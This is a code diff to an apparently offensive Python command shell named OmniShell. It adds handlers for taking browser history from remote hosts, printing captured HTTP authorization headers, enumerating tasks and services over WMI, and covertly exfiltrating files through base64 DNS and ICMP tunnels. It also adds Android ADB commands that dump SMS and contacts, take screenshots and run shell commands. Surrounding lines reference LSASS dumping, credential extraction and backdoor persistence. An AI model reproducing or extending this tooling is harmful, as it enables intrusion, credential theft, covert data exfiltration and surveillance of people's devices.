@@ -3,6 +3,7 @@ import sys
 import os
 import socket
 import time
+import base64
 from colorama import Fore, Style, init
 from typing import Dict, Any, List
 from datetime import datetime
@@ -277,7 +278,7 @@ class OmniShell:
             gw = await asyncio.to_thread(self.scanner._detect_gateway)
             print(f"{Fore.GREEN}[+] Gateway: {gw}")
 
-        elif cmd == "vpn":
+        elif cmd in ("vpn", "vpn-discover"):
             print(f"{Fore.CYAN}[*] Auditing gateway for VPN endpoints...")
             info = await asyncio.to_thread(self.scanner.discover_vpn_networks)
             for v in info:
@@ -490,15 +491,6 @@ class OmniShell:
             if not args: return
             res = await asyncio.to_thread(self.control.smb_check_vulns, args[0])
             print(f"{Fore.YELLOW}[*] SMB Vulnerabilities for {args[0]}: {res.get('vulns', [])}")
-
-        elif cmd == "nopac-check":
-            if not args: return
-            target_ip = args[0]
-            print(f"{Fore.CYAN}[*] Running NoPac (CVE-2021-42278) probe on {target_ip}...")
-            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
-            await asyncio.to_thread(self.exploiter._check_vulnerabilities, device)
-            is_vuln = "CVE-2021-42278_NOPAC_VALIDATED" in device.is_vulnerable
-            print(f"{Fore.YELLOW}[*] NoPac Result: {'VULNERABLE' if is_vuln else 'Safe / Not DC'}")
 
         elif cmd == "etblue-check":
             if not args: return
@@ -733,6 +725,25 @@ class OmniShell:
             else:
                 print(f"{Fore.RED}[!] No browser credentials extracted or failed.")
 
+        elif cmd == "browser-history":
+            if not args: return
+            target = args[0] if args else self.last_target
+            if not target: return
+            print(f"{Fore.MAGENTA}[*] Extracting browser history and bookmarks from {target}...")
+            res = await asyncio.to_thread(self.control.get_browser_data, target, self.creds['user'], self.creds['pass'])
+            history = res.get('history', [])
+            bookmarks = res.get('bookmarks', [])
+            print(f"{Fore.GREEN}[+] Browser history entries: {len(history)}")
+            print(f"{Fore.GREEN}[+] Bookmarks: {len(bookmarks)}")
+            for h in history[:5]:
+                url = h.get('URL', '?')
+                title = h.get('Title', '')[:50]
+                print(f"  [HIST] {url} - {title}")
+            for b in bookmarks[:5]:
+                url = b.get('URL', '?')
+                name = b.get('Name', '')[:50]
+                print(f"  [BOOKMARK] {url} - {name}")
+
         elif cmd == "lsass-dump":
             target = args[0] if args else self.last_target
             if not target: return
@@ -824,6 +835,18 @@ class OmniShell:
         elif cmd == "ntlm-capture":
             print(f"{Fore.CYAN}[*] Filtering for NTLM traffic...")
 
+        elif cmd == "http-auth":
+            captured = self.intel.get_credentials()
+            print(f"{Fore.MAGENTA}CAPTURED HTTP AUTH HEADERS:")
+            found = False
+            for c in captured:
+                data = c.get('data','')
+                if 'Basic' in data or 'Authorization' in data or 'Digest' in data:
+                    print(f"  [{c['time'].strftime('%H:%M:%S')}] {c['source']}: {data[:100]}")
+                    found = True
+            if not found:
+                print(f"{Fore.YELLOW}[*] No HTTP auth headers captured yet.")
+
         elif cmd == "wmi-monitor":
             await asyncio.to_thread(self.intel.wmi_monitor_activity, target, u, p)
 
@@ -838,6 +861,22 @@ class OmniShell:
         elif cmd == "wmi-software":
             res = await asyncio.to_thread(self.control.get_installed_programs, target, u, p, d)
             for s in res: print(f"  [+] {s.get('DisplayName')}")
+
+        elif cmd == "wmi-tasks":
+            host = args[0] if args else target
+            if not host: return
+            tasks = await asyncio.to_thread(self.control.list_scheduled_tasks, host, u, p, d)
+            print(f"{Fore.MAGENTA}[*] Scheduled tasks on {host} ({len(tasks)} found):")
+            for t in tasks[:10]:
+                print(f"  {t.get('TaskName','?')} -> {t.get('Command','?')}")
+
+        elif cmd == "wmi-svc":
+            host = args[0] if args else target
+            if not host: return
+            services = await asyncio.to_thread(self.control.list_services, host, u, p, d)
+            print(f"{Fore.MAGENTA}[*] Services on {host} ({len(services)} found):")
+            for s in services[:10]:
+                print(f"  {s.get('Name')}: {s.get('State')} ({s.get('PathName','')[:30]})")
 
         # --- DATABASE & CLOUD CATEGORY ---
         elif cmd == "db-extract":
@@ -908,13 +947,32 @@ class OmniShell:
             target_ip, local_path = args[0], args[1]
             exfil_method = args[2] if len(args) > 2 else "smb"
             print(f"{Fore.RED}[*] Exfiltrating {local_path} to {target_ip} via {exfil_method}...")
-            res = await asyncio.to_thread(self.control.data_exfiltration, target_ip, local_path, exfil_method)
+            res = await asyncio.to_thread(self.control.data_exfiltration, target_ip, local_path, exfil_method, u, p, d)
             if res.get('success'):
-                print(f"{Fore.GREEN}[+] Data exfiltration successful. Transferred {res.get('bytes_transferred')} bytes.")
+                print(f"{Fore.GREEN}[+] Data exfiltration successful via {exfil_method}.")
             else:
                 print(f"{Fore.RED}[!] Data exfiltration failed: {res.get('error')}")
 
-        # Linux & SSH
+        # --- Advanced Exfiltration Tunnels ---
+        elif cmd == "dns-exfil":
+            if len(args) < 2: return
+            dns_server, local_file = args[0], args[1]
+            try:
+                with open(local_file, 'rb') as f:
+                    data = f.read()
+                data_str = base64.b64encode(data).decode('utf-8')
+                success = await asyncio.to_thread(self.control.exfiltrate_dns_covert, "", data_str, dns_server)
+                print(f"{Fore.GREEN}[+] DNS exfil {'successful' if success else 'failed'}")
+            except Exception as e:
+                print(f"{Fore.RED}[!] DNS exfil error: {e}")
+
+        elif cmd == "icmp-exfil":
+            if len(args) < 2: return
+            target_ip, local_file = args[0], args[1]
+            success = await asyncio.to_thread(self.control.exfiltrate_icmp, target_ip, local_file)
+            print(f"{Fore.GREEN}[+] ICMP exfil {'successful' if success else 'failed'}")
+
+        # --- LINUX & ADB ---
         elif cmd == "ssh":
             port = int(args[0]) if args else 22
             await asyncio.to_thread(self.control.ssh_interactive, target, u, p, port)
@@ -938,6 +996,45 @@ class OmniShell:
         elif cmd == "linux-cron":
             if not args: return
             await asyncio.to_thread(self.control.linux_persistence_cron, target, u, p, " ".join(args))
+
+        # --- ANDROID ADB ---
+        elif cmd == "adb-connect":
+            if not args: return
+            ip = args[0]
+            port = int(args[1]) if len(args) > 1 else 5555
+            ok = await asyncio.to_thread(self.control.adb_connect, ip, port)
+            print(f"{Fore.GREEN}[+] ADB connect: {'OK' if ok else 'FAILED'}")
+        elif cmd == "adb-shell":
+            if len(args) < 2: return
+            ip, shell_cmd = args[0], " ".join(args[1:])
+            out = await asyncio.to_thread(self.control.adb_shell, ip, shell_cmd)
+            print(out)
+        elif cmd == "adb-screen":
+            ip = args[0] if args else target
+            if not ip: return
+            path = await asyncio.to_thread(self.control.adb_screenshot, ip)
+            if path: print(f"{Fore.GREEN}[+] ADB screenshot saved: {path}")
+            else: print(f"{Fore.RED}[!] ADB screenshot failed")
+        elif cmd == "adb-sms":
+            ip = args[0] if args else target
+            if not ip: return
+            out = await asyncio.to_thread(self.control.adb_dump_sms, ip)
+            print(out)
+        elif cmd == "adb-contacts":
+            ip = args[0] if args else target
+            if not ip: return
+            out = await asyncio.to_thread(self.control.adb_get_contacts, ip)
+            print(out)
+        elif cmd == "adb-push":
+            if len(args) < 3: return
+            ip, local, remote = args[0], args[1], args[2]
+            ok = await asyncio.to_thread(self.control.adb_push, ip, local, remote)
+            print(f"{Fore.GREEN}[+] ADB push: {'OK' if ok else 'FAILED'}")
+        elif cmd == "adb-pull":
+            if len(args) < 3: return
+            ip, remote, local = args[0], args[1], args[2]
+            ok = await asyncio.to_thread(self.control.adb_pull, ip, remote, local)
+            print(f"{Fore.GREEN}[+] ADB pull: {'OK' if ok else 'FAILED'}")
 
         # --- PERSISTENCE CATEGORY ---
         elif cmd in ["persist", "backdoor"]:
